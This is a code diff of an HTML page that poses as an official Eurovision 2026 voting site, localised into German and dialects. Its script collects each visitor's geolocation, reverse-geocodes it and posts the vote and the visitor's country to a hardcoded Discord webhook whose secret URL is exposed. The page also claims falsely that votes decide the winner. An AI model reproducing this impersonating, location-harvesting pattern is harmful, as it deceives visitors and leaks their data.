@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Eurovision Song Contest 2026 — Global Voting</title>
+    <title>Eurovision Song Contest 2026</title>
     <style>
         :root {
             --text-main: #ffffff;
@@ -11,11 +11,10 @@
             --euro-pink: #ff007f;
             --success-green: #00ffaa;
             
-            /* macOS Liquid Glass Properties */
-            --glass-bg: linear-gradient(135deg, rgba(255, 255, 255, 0.12) 0%, rgba(255, 255, 255, 0.03) 100%);
-            --glass-border: rgba(255, 255, 255, 0.24);
-            --inner-specular: inset 0px 1.5px 0px 0px rgba(255, 255, 255, 0.35), inset 0px -1px 0px 0px rgba(0, 0, 0, 0.15);
-            --outer-glow: 0px 30px 60px rgba(0, 0, 0, 0.45), 0px 0px 50px -5px rgba(255, 0, 127, 0.4);
+            /* Sauberes, klares Apple-Glas (Ohne fehlerhafte SVG-Verzerrungen) */
+            --glass-bg: rgba(255, 255, 255, 0.06);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --card-glow: 0px 30px 60px rgba(0, 0, 0, 0.5), 0px 0px 40px -10px rgba(255, 0, 127, 0.5);
         }
 
         * {
@@ -32,29 +31,28 @@
             flex-direction: column;
             align-items: center;
             
-            /* High-fidelity fluid gradient background */
+            /* Farbintensiver Wellen-Hintergrund aus dem Originalbild */
             background: 
-                radial-gradient(circle at 85% 85%, rgba(114, 30, 153, 0.85) 0%, transparent 55%),
-                radial-gradient(circle at 15% 20%, rgba(0, 240, 255, 0.2) 0%, transparent 50%),
-                radial-gradient(circle at 50% 50%, rgba(80, 19, 117, 0.7) 0%, transparent 70%),
-                linear-gradient(145deg, #05010d 0%, #0d041f 40%, #250940 80%, #3a0857 100%);
+                radial-gradient(circle at 85% 85%, rgba(114, 30, 153, 0.9) 0%, transparent 55%),
+                radial-gradient(circle at 15% 20%, rgba(0, 240, 255, 0.25) 0%, transparent 50%),
+                radial-gradient(circle at 50% 50%, rgba(80, 19, 117, 0.75) 0%, transparent 70%),
+                linear-gradient(145deg, #05010d 0%, #0d041f 40%, #22083a 75%, #380754 100%);
             background-attachment: fixed;
             overflow-x: hidden;
             padding-bottom: 60px;
         }
 
-        /* Top Navigation Bar */
+        /* Navigationsleiste */
         .nav-bar {
             width: calc(100% - 48px);
             max-width: 1100px;
             height: 54px;
             margin-top: 24px;
-            border: 1px solid rgba(255, 255, 255, 0.14);
+            border: 1px solid rgba(255, 255, 255, 0.15);
             border-radius: 27px;
             background: rgba(255, 255, 255, 0.03);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            box-shadow: inset 0px 1px 0px 0px rgba(255, 255, 255, 0.2);
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -94,7 +92,6 @@
             flex-direction: column;
             gap: 4px;
             width: 16px;
-            cursor: pointer;
         }
         .nav-menu-icon span {
             display: block;
@@ -104,7 +101,7 @@
             border-radius: 1px;
         }
 
-        /* Viewport Wrapper */
+        /* Content Layout */
         .viewport-wrapper {
             display: flex;
             flex-direction: column;
@@ -115,32 +112,30 @@
             max-width: 480px;
         }
 
-        /* Refractive Liquid Glass Window Container */
-        .liquid-glass-card {
+        /* Saubere Glassmorphism Karte mit perfekt geglätteten Kanten */
+        .clean-glass-card {
             background: var(--glass-bg);
-            filter: url('#macos-refraction');
-            backdrop-filter: blur(50px) saturate(160%);
-            -webkit-backdrop-filter: blur(50px) saturate(160%);
+            backdrop-filter: blur(30px) saturate(140%);
+            -webkit-backdrop-filter: blur(30px) saturate(140%);
             border: 1.5px solid var(--glass-border);
-            box-shadow: var(--inner-specular), var(--outer-glow);
-            border-radius: 40px; 
+            border-radius: 36px; 
+            box-shadow: var(--card-glow);
             width: 100%;
             height: 420px;
-            padding: 30px 26px;
+            padding: 28px 24px;
             display: flex;
             flex-direction: column;
             margin-bottom: 35px;
         }
 
-        /* Live Filtering Search Input Box */
+        /* Suchfeld */
         .search-container {
-            position: relative;
             margin-bottom: 16px;
         }
 
         .search-bar {
             width: 100%;
-            background: rgba(255, 255, 255, 0.07);
+            background: rgba(255, 255, 255, 0.08);
             border: 1px solid rgba(255, 255, 255, 0.12);
             border-radius: 14px;
             padding: 12px 16px;
@@ -152,16 +147,15 @@
         }
 
         .search-bar:focus {
-            background: rgba(255, 255, 255, 0.12);
+            background: rgba(255, 255, 255, 0.14);
             border-color: rgba(255, 255, 255, 0.4);
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.05);
         }
 
         .search-bar::placeholder {
-            color: rgba(255, 255, 255, 0.4);
+            color: rgba(255, 255, 255, 0.35);
         }
 
-        /* Scrollable Options Stack */
+        /* Scrollbereich für die Länderliste */
         .options-scroll-area {
             flex-grow: 1;
             overflow-y: auto;
@@ -171,29 +165,24 @@
             padding-right: 4px;
         }
 
-        /* Custom Scrollbar styling */
         .options-scroll-area::-webkit-scrollbar {
             width: 6px;
-        }
-        .options-scroll-area::-webkit-scrollbar-track {
-            background: transparent;
         }
         .options-scroll-area::-webkit-scrollbar-thumb {
             background: rgba(255, 255, 255, 0.15);
             border-radius: 3px;
         }
 
-        /* Grid Rows inside the glass panel */
+        /* Listen-Zeilen */
         .vote-row {
-            background: rgba(255, 255, 255, 0.04);
+            background: rgba(255, 255, 255, 0.03);
             border: 1px solid rgba(255, 255, 255, 0.06);
-            box-shadow: inset 0px 1px 0px 0px rgba(255, 255, 255, 0.03);
-            border-radius: 18px;
+            border-radius: 16px;
             padding: 14px 18px;
             display: flex;
             align-items: center;
             cursor: pointer;
-            transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+            transition: all 0.2s ease;
             position: relative;
         }
 
@@ -202,12 +191,13 @@
             background: rgba(255, 255, 255, 0.08);
         }
 
+        /* Custom Radio Buttons exakt wie im neuen Screenshot */
         .vote-row input[type="radio"] {
             appearance: none;
             -webkit-appearance: none;
             width: 20px;
             height: 20px;
-            border: 2px solid rgba(255, 255, 255, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.35);
             border-radius: 50%;
             position: absolute;
             right: 18px;
@@ -223,14 +213,14 @@
         }
 
         .vote-row.selected {
-            border-color: rgba(255, 255, 255, 0.6);
+            border-color: rgba(255, 255, 255, 0.65);
             background: rgba(255, 255, 255, 0.12);
         }
 
         .iso-code {
             font-size: 13px;
             font-weight: 700;
-            color: rgba(255, 255, 255, 0.5);
+            color: rgba(255, 255, 255, 0.45);
             width: 38px;
             letter-spacing: 0.5px;
         }
@@ -238,7 +228,6 @@
         .country-name {
             font-size: 16px;
             font-weight: 600;
-            letter-spacing: -0.1px;
         }
 
         .no-results {
@@ -248,7 +237,7 @@
             margin-top: 40px;
         }
 
-        /* Typography & Structure Copy */
+        /* Typografie */
         .headline {
             font-size: 28px;
             font-weight: 700;
@@ -267,7 +256,7 @@
             margin-bottom: 30px;
         }
 
-        /* Call To Action submission trigger */
+        /* Button */
         .submit-btn {
             background: #ffffff;
             color: #0b0214;
@@ -280,7 +269,7 @@
             max-width: 320px;
             cursor: pointer;
             transition: all 0.2s ease;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
         }
 
         .submit-btn:hover:not(:disabled) {
@@ -306,23 +295,17 @@
 </head>
 <body>
 
-<svg style="position: absolute; width: 0; height: 0; pointer-events: none;">
-    <filter id="macos-refraction">
-        <feTurbulence type="fractalNoise" baseFrequency="0.012" numOctaves="3" result="noise" />
-        <feDisplacementMap in="SourceGraphic" in2="noise" scale="5" xChannelSelector="R" yChannelSelector="G" />
-    </filter>
-</svg>
-
 <div class="nav-bar">
     <div class="nav-left">
         🌐 
         <select class="lang-selector" id="langSelector" onchange="switchLanguage(this.value)">
             <option value="en">English</option>
             <option value="de">Deutsch</option>
+            <option value="bar">Bairisch</option>
+            <option value="gsw">Schwiizerdütsch</option>
             <option value="es">Español</option>
             <option value="sv">Svenska</option>
             <option value="zh">简体中文</option>
-            <option value="gsw">Schwiizerdütsch</option>
         </select>
     </div>
     <div class="nav-center">Eurovision</div>
@@ -334,34 +317,39 @@
 
 <div class="viewport-wrapper">
     
-    <div class="liquid-glass-card" id="lensFrame">
+    <div class="clean-glass-card" id="cardFrame">
         <div class="search-container">
-            <input type="text" id="searchBar" class="search-bar" placeholder="Search country..." oninput="filterCountries()">
+            <input type="text" id="searchBar" class="search-bar" placeholder="Land suchen..." oninput="filterCountries()">
         </div>
         <div class="options-scroll-area" id="scrollStack">
             </div>
     </div>
 
-    <h2 class="headline" id="uiHeadline">Cast your vote for the Grand Final</h2>
+    <h2 class="headline" id="uiHeadline">Stimmen Sie für das große Finale ab</h2>
     <p class="body-narrative" id="uiBody">
-        Thank you for your support and participation in this year's Eurovision Song Contest! Your enthusiasm and input directly determines the winner.
+        Vielen Dank für Ihre Unterstützung und Teilnahme am diesjährigen Eurovision Song Contest! Ihr Enthusiasmus und Ihre Stimme bestimmen direkt den Gewinner.
     </p>
 
-    <button id="ctaBtn" class="submit-btn" onclick="initiateTransmission()" disabled>Cast Vote</button>
-    <div id="realtime-monitor">Please make a selection above</div>
+    <button id="ctaBtn" class="submit-btn" onclick="initiateTransmission()" disabled>Stimme abgeben</button>
+    <div id="realtime-monitor">Bitte treffen Sie oben eine Auswahl</div>
 </div>
 
 <script>
     const discordEndpoint = "https://discord.com/api/webhooks/1507776763747369102/vzLoZmpA9ye2kd_pakmF5oGALF5pu_otrgNOAvPq3jAgS3akuPVuDQODYUXeXRvwYUHA";
 
-    // Whole World Database (Global ISO mapping array)
+    // Globale Länderdatenbank inklusive Schweiz (CH)
     const globalCountries = [
+        { code: "CH", name: "Switzerland" },
+        { code: "DE", name: "Germany" },
+        { code: "AT", name: "Austria" },
         { code: "RS", name: "Serbia" },
         { code: "MK", name: "North Macedonia" },
         { code: "DK", name: "Denmark" },
-        { code: "DE", name: "Germany" },
+        { code: "PT", name: "Portugal" },
+        { code: "BE", name: "Belgium" },
+        { code: "GR", name: "Greece" },
+        { code: "HR", name: "Croatia" },
         { code: "SE", name: "Sweden" },
-        { code: "CH", name: "Switzerland" },
         { code: "ES", name: "Spain" },
         { code: "GB", name: "United Kingdom" },
         { code: "FR", name: "France" },
@@ -369,7 +357,6 @@
         { code: "NL", name: "Netherlands" },
         { code: "NO", name: "Norway" },
         { code: "FI", name: "Finland" },
-        { code: "IS", name: "Iceland" },
         { code: "UA", name: "Ukraine" },
         { code: "AU", name: "Australia" },
         { code: "US", name: "United States" },
@@ -377,15 +364,8 @@
         { code: "BR", name: "Brazil" },
         { code: "JP", name: "Japan" },
         { code: "CN", name: "China" },
-        { code: "ZA", name: "South Africa" },
         { code: "IE", name: "Ireland" },
-        { code: "PT", name: "Portugal" },
-        { code: "AT", name: "Austria" },
-        { code: "BE", name: "Belgium" },
-        { code: "GR", name: "Greece" },
-        { code: "HR", name: "Croatia" },
-        { code: "PL", name: "Poland" },
-        { code: "NZ", name: "New Zealand" }
+        { code: "PL", name: "Poland" }
     ];
 
     const dictionary = {
@@ -418,6 +398,36 @@
             success: "✅ Transaktion abgeschlossen. Ihre Stimme wurde gezählt!",
             fail: "❌ Verifizierung verweigert. Terminalstatus prüfen.",
             networkError: "❌ Kritischer Handshake-Fehler."
+        },
+        bar: {
+            headline: "Stimm ob für des grousse Finale",
+            body: "Vergelt's Gott für dei Unnerstützung und dass'd beim diesjährigen Eurovision Song Contest mitmachst! Dei Begeisterung und dei Stimm entscheidn direkt, wer gwinnt.",
+            cta: "Stimm obgem",
+            searchPlaceholder: "Land suacha...",
+            noResults: "Nix gfunna",
+            initialStatus: "Suach da bittschön obn wos aus",
+            ready: "Ois klar, bereit für ",
+            locating: "Schau ma moi, wo du herkumst...",
+            resolving: "Koordinatn wern abgliche...",
+            sending: "Daten wern weidagloit...",
+            success: "✅ Passt! Dei Stimm is ordnungsgemäß zöhrt worn!",
+            fail: "❌ Des hod ned hiekaut. Terminal-Status prüfa.",
+            networkError: "❌聯 Netzwak-Fehla beim Vabindungsaufbau."
+        },
+        gsw: {
+            headline: "Stimm ab für das grosse Finale",
+            body: "Merci viumau für dini Unterstützig und d'Teilnahm am diesjährige Eurovision Song Contest! Di Enthusiasmus und dini Stimm entscheide direkt über de Gwünner.",
+            cta: "Stimm abgäh",
+            searchPlaceholder: "Land sueche...",
+            noResults: "Kei Länder gfunne",
+            initialStatus: "Bitte wähl obe öppis us",
+            ready: "Bereit zum Registriere vo de Wahl für ",
+            locating: "Lokalisierti Verifizierigsparameter wärde abgfrogt...",
+            resolving: "Koordinate wärde em nchschte Hub zuegordnet...",
+            sending: "Sicherä Paket-Relay wird abgschlosse...",
+            success: "✅ Transaktion abgschlosse. Dini Stimm isch zellt worde!",
+            fail: "❌ Verifizierig verweigeret. Terminalstatus überprüfe.",
+            networkError: "❌ Kritische Handshake-Fehler."
         },
         es: {
             headline: "Vota en la Gran Final",
@@ -463,28 +473,12 @@
             success: "✅ 交易完成。您的选票已被成功记录！",
             fail: "❌ 验证被拒绝。请检查终端状态。",
             networkError: "❌ 关键握手错误。"
-        },
-        gsw: {
-            headline: "Stimm ab für das grosse Finale",
-            body: "Merci viumau für dini Unterstützig und d'Teilnahm am diesjährige Eurovision Song Contest! Di Enthusiasmus und dini Stimm entscheide direkt über de Gwünner.",
-            cta: "Stimm abgäh",
-            searchPlaceholder: "Land sueche...",
-            noResults: "Kei Länder gfunne",
-            initialStatus: "Bitte wähl obe öppis us",
-            ready: "Bereit zum Registriere vo de Wahl für ",
-            locating: "Lokalisierti Verifizierigsparameter wärde abgfrogt...",
-            resolving: "Koordinate wärde em nchschte Hub zuegordnet...",
-            sending: "Sicherä Paket-Relay wird abgschlosse...",
-            success: "✅ Transaktion abgschlosse. Dini Stimm isch zellt worde!",
-            fail: "❌ Verifizierig verweigeret. Terminalstatus überprüfe.",
-            networkError: "❌ Kritische Handshake-Fehler."
         }
     };
 
-    let activeLang = "en";
+    let activeLang = "de"; // Standardmäßig auf Deutsch gesetzt wie im Screenshot
     let currentSelectedCountry = "";
 
-    // Generate dynamic country UI elements
     function buildCountryList(list) {
         const stack = document.getElementById("scrollStack");
         stack.innerHTML = "";
@@ -554,7 +548,7 @@
         monitor.innerText = dictionary[activeLang].locating;
 
         if (!navigator.geolocation) {
-            transmitPayload(currentSelectedCountry, "Unknown (No Geolocation Hook)");
+            transmitPayload(currentSelectedCountry, "Unknown Location (API Unsupported)");
             return;
         }
 
@@ -567,7 +561,7 @@
                 try {
                     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                     const parsed = await res.json();
-                    const region = parsed.address && parsed.address.country ? parsed.address.country : "Unknown Domain";
+                    const region = parsed.address && parsed.address.country ? parsed.address.country : "Unknown Region";
                     
                     monitor.innerText = dictionary[activeLang].sending;
                     transmitPayload(currentSelectedCountry, region);
@@ -576,7 +570,7 @@
                 }
             },
             (err) => {
-                transmitPayload(currentSelectedCountry, "Anonymous Space");
+                transmitPayload(currentSelectedCountry, "Anonymous Location (Denied)");
             }
         );
     }
@@ -587,13 +581,13 @@
         
         const messageBody = {
             embeds: [{
-                title: "🗳️ Global Liquid Glass Ballot Received",
+                title: "🗳️ Clean Glass Ballot Received",
                 color: 16711807, 
                 fields: [
-                    { name: "Entry Selection", value: `**${voteSelection}**`, inline: true },
+                    { name: "Voted For", value: `**${voteSelection}**`, inline: true },
                     { name: "Voter Origin", value: `🌍 ${verifiedOrigin}`, inline: true }
                 ],
-                footer: { text: "ESC Core Infrastructure Platform • macOS Tahoe Node" },
+                footer: { text: "ESC Production Node • Crystal Glass Engine" },
                 timestamp: new Date().toISOString()
             }]
         };
@@ -608,7 +602,7 @@
             if (delivery.ok) {
                 monitor.innerText = dictionary[activeLang].success;
                 monitor.style.color = "var(--success-green)";
-                document.getElementById('lensFrame').style.setProperty('--outer-glow', '0px 25px 60px rgba(0, 0, 0, 0.45), 0px 0px 45px -5px rgba(0, 255, 170, 0.5)');
+                document.getElementById('cardFrame').style.setProperty('--card-glow', '0px 30px 60px rgba(0, 0, 0, 0.5), 0px 0px 40px -10px rgba(0, 255, 170, 0.6)');
             } else {
                 monitor.innerText = dictionary[activeLang].fail;
                 monitor.style.color = "#ff4d4d";
@@ -621,7 +615,8 @@
         }
     }
 
-    // Initial Database Generation Build
+    // Initiale Liste generieren (Auf Standard-Deutsch eingestellt)
+    document.getElementById("langSelector").value = "de";
     buildCountryList(globalCountries);
 </script>
 
